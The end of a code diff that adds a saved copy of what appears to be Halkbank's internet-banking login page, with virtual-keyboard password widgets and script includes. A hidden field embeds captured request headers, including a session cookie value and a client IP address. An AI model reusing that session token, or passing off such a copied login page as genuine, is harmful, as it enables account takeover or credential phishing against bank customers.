+                        objCorporate.removeAttr('readonly');
+                    }
+                });
+
+                $('.modal-header span.close').on('click', function () {
+                    $('.modal').removeClass('in').hide();
+
+                });
+            });
+
+        });
+
+        document.getElementById("main").removeAttribute("hidden");
+
+    </script>
+
+
+
+
+    <vb-virtual-keyboard vb-selector=".password-keyboard, .keyboard-input" vb-maskchar="*" vb-culture="tr"
+        vb-position-my="left top" vb-position-at="right bottom" vb-id="password-keyboard"
+        vb-position-at-two="left bottom" vb-open-on="nothing"></vb-virtual-keyboard>
+
+    <vb-virtual-keyboard vb-selector=".numeric-input" vb-maskchar="*" vb-culture="tr" vb-position-my="left top"
+        vb-position-at="right bottom" vb-id="password-keyboard2" vb-mode="numpad" vb-maxlength="6"
+        vb-position-at-two="left bottom"></vb-virtual-keyboard>
+
+
+
+
+
+    <script type="text/javascript"
+        src="/InternetBankingHost/Features/wwwroot/statics/js/jquery-all.js?v=1725635390754"></script>
+    <script type="text/javascript"
+        src="/InternetBankingHost/Features/wwwroot/statics/js/angular-all.js?v=1725635390754"></script>
+    <script type="text/javascript"
+        src="/InternetBankingHost/Features/wwwroot/statics/js/plugins-all.js?v=1725635390754"></script>
+    <script type="text/javascript"
+        src="/InternetBankingHost/Features/wwwroot/statics/js/highcharts-all.js?v=1725635390754"></script>
+    <script type="text/javascript"
+        src="/InternetBankingHost/Features/wwwroot/statics/js/dataTables-all.js?v=1725635390754"></script>
+    <script type="text/javascript"
+        src="/InternetBankingHost/Features/wwwroot/statics/js/pdf.js?v=1725635390754"></script>
+    <script type="text/javascript"
+        src="/InternetBankingHost/Features/wwwroot/statics/js/jsencrypt-all.js?v=1725635390754"></script>
+
+    <script type="text/javascript"
+        src="/InternetBankingHost/Features/wwwroot/statics/js/paperlessBanking.js?v=1725635390754"></script>
+
+    <script>
+        window['pdfjs-dist/build/pdf'].GlobalWorkerOptions.workerSrc = "/InternetBankingHost/Features/wwwroot/statics/js/pdf.worker.js?v=1609252643712";
+    </script>
+
+
+    <script type="text/javascript">
+        _.set(window, 'VeriBranch.Config.UniqueKey', '');
+    </script>
+    <script type="text/javascript"
+        src="/InternetBankingHost/Features/wwwroot/statics/js/vb-all.js?v=1725635390754"></script>
+    <script type="text/javascript"
+        src="/InternetBankingHost/Features/wwwroot/VeriBranch.Web/Modules/veribranch.directives.js?v=1725635390754"></script>
+
+
+    <script type="text/javascript"
+        src="/InternetBankingHost/Features/wwwroot/statics/js/login-app-all.js?v=1725635390754"></script>
+    <script type="text/javascript"
+        src="/InternetBankingHost/Features/wwwroot/statics/js/jsencrypt-all.js?v=1725635390754"></script>
+
+
+    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="user_prefs2" name="user_prefs2">
+    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="hkb-user_prefs"
+        name="hkbuser_prefs">
+    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="clnthdr" name="clnthdr"
+        value="{&quot;Connection&quot;:[&quot;keep-alive&quot;],&quot;Accept&quot;:[&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate, br, zstd&quot;],&quot;Accept-Language&quot;:[&quot;tr-TR,tr;q=0.9&quot;],&quot;Cookie&quot;:[&quot;VB_IBHSession=4afda3da5c8cf0c00874f71b972b5b5f5c6af4b260cfecc63eefb11ee340f9ddfb557574&quot;],&quot;Host&quot;:[&quot;sube.halkbank.com.tr&quot;],&quot;Referer&quot;:[&quot;https://www.google.com/&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1&quot;],&quot;Upgrade-Insecure-Requests&quot;:[&quot;1&quot;],&quot;Sec-Fetch-Site&quot;:[&quot;cross-site&quot;],&quot;Sec-Fetch-Mode&quot;:[&quot;navigate&quot;],&quot;Sec-Fetch-User&quot;:[&quot;?1&quot;],&quot;Sec-Fetch-Dest&quot;:[&quot;document&quot;],&quot;X-ip&quot;:[&quot;31.206.6.143&quot;],&quot;X-Port&quot;:[&quot;20486&quot;],&quot;ServerVariables&quot;:[&quot;20486&quot;]}">
+    <script type="text/javascript"
+        src="/InternetBankingHost/Features/wwwroot/statics/sa/js/sa-all.js?v=1725635390754"></script>
+
+    <a href="javascript:void(0)" class="back-to-top visible-xs">Başa D&#246;n</a>
+</body>
+
+</html>
